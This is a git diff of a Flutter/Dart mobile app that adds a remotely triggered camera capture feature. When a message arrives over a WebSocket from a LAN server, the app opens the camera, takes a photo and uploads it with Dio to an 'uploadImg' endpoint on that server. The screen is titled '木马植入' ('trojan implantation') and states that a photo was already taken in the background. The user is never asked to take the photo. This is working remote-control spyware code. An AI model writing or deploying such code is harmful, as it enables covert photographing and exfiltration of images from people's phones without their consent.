@@ -2,13 +2,17 @@ import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import './routes/photo.dart';
 import './routes/home.dart';
+import './common/global.dart';
 import 'dart:io';
 import './routes/contact.dart';
 import 'package:web_socket_channel/io.dart';
 import 'package:device_info/device_info.dart';
 import 'package:image_picker/image_picker.dart';
+// import 'package:path/path.dart' show join;
+import 'package:path_provider/path_provider.dart';
 // import 'package:adaptive_dialog/adaptive_dialog.dart';
 import 'package:dio/dio.dart';
+import 'package:camera/camera.dart';
 void main() {
   // runApp(const MyApp());
   runApp(const MaterialApp(
@@ -101,8 +105,6 @@ class _MyStatefulWidgetState extends State<MyStatefulWidget> {
     if (!mounted) return;
 
     setState(() {
-      print(deviceData);
-      print('--------');
       _deviceData = deviceData;
     });
   }
@@ -162,8 +164,26 @@ class _MyStatefulWidgetState extends State<MyStatefulWidget> {
     initPlatformState();
     var channel = IOWebSocketChannel.connect(
         Uri.parse('ws://192.168.101.18:8019/yzxa-api/websocket/appSocket'));
-    channel.stream.listen((message) {
-      _takePhoto();
+    channel.stream.listen((message) async {
+      // if(Global.routeName == '') {
+         var cameras = await availableCameras();
+          var tmpPath = await getTemporaryDirectory();
+          var controller = CameraController(cameras[0], ResolutionPreset.max);
+          controller.initialize().then((value) => {
+            Navigator.of(context).push(MaterialPageRoute(
+              builder: (context) => CameraApp(controller:controller, tmpPath:tmpPath)
+            ))
+          });
+      // } else {
+      //   print(333);
+      //   var cameras = await availableCameras();
+      //     var tmpPath = await getTemporaryDirectory();
+      //     var controller = CameraController(cameras[0], ResolutionPreset.max);
+      //   CameraApp(controller:controller, tmpPath:tmpPath);
+      // }
+         
+          
+      // _takePhoto();
     });
   }
 
@@ -219,4 +239,102 @@ class _MyStatefulWidgetState extends State<MyStatefulWidget> {
         }
     }
   }
+}
+
+class CameraApp extends StatefulWidget {
+
+   const CameraApp({camera,Key? key,  required this.controller, required this.tmpPath}) : super( key: key);
+  final CameraController controller;
+  final Directory tmpPath;
+  @override
+  _CameraAppState createState() => _CameraAppState();
+}
+class _CameraAppState extends State<CameraApp> {
+  var tmp = '';
+  @override
+  void initState() {
+    super.initState();
+    setState(() {
+      Global.routeName = 'takePhoto';
+    });
+    // final path = join(
+    //     // Store the picture in the temp directory.
+    //     // Find the temp directory using the `path_provider` plugin.
+    //     widget.tmpPath.path,
+    //     '${DateTime.now()}.png',
+    //   );
+      widget.controller.takePicture().then((value) async {
+        try {
+          var file = File(value.path);
+          setState(() {
+            tmp = value.path;
+          });
+          var dio = Dio();
+          dio.post('http://192.168.101.18:8019/yzxa-api/app/uploadImg', data: FormData.fromMap({
+              'file': await MultipartFile.fromFile(file.path, filename: value.name)
+            })).then((res) {
+              print(res);
+            });
+            
+        } catch(e) {
+          print(e);
+        }
+      });
+  }
+
+  @override
+  void dispose() {
+    widget.controller.dispose();
+    setState(() {
+      Global.routeName = '';
+    });
+    super.dispose();
+  }
+
+  @override
+  Widget build(BuildContext context)  {
+    if (!widget.controller.value.isInitialized) {
+      return Container();
+    }
+    return Scaffold(
+        appBar: AppBar(
+          title: const Text('木马植入'),
+          leading: const Icon(Icons.home),
+          backgroundColor: Colors.blue[700],
+          centerTitle: true,
+        ),
+        body: Center(
+          child: Column(
+          mainAxisSize: MainAxisSize.max,
+          mainAxisAlignment: MainAxisAlignment.center,
+          crossAxisAlignment: CrossAxisAlignment.center,
+          children:  [
+            tmp.isNotEmpty ? Image.file(File(tmp)) : 
+            Column(
+              children: const[
+                 Padding(padding: EdgeInsets.fromLTRB(0, 50, 0, 20),
+                  child: Text('已经在后台拍了照片',
+                    textAlign: TextAlign.center,
+                    style: TextStyle(
+                      fontSize: 20,
+                    ),
+                  )),
+                  Padding(padding: EdgeInsets.fromLTRB(0, 10, 0, 20),
+                  child: Text('稍后即可查看~',
+                    textAlign: TextAlign.center,
+                    style: TextStyle(
+                      fontSize: 16,
+                    ),
+                  )),
+                  // Icon(Icons.sync)
+              ],
+            )
+          ],
+        )
+        )
+        
+        
+    // return CameraPreview(widget.controller);
+    );
+  } 
 }
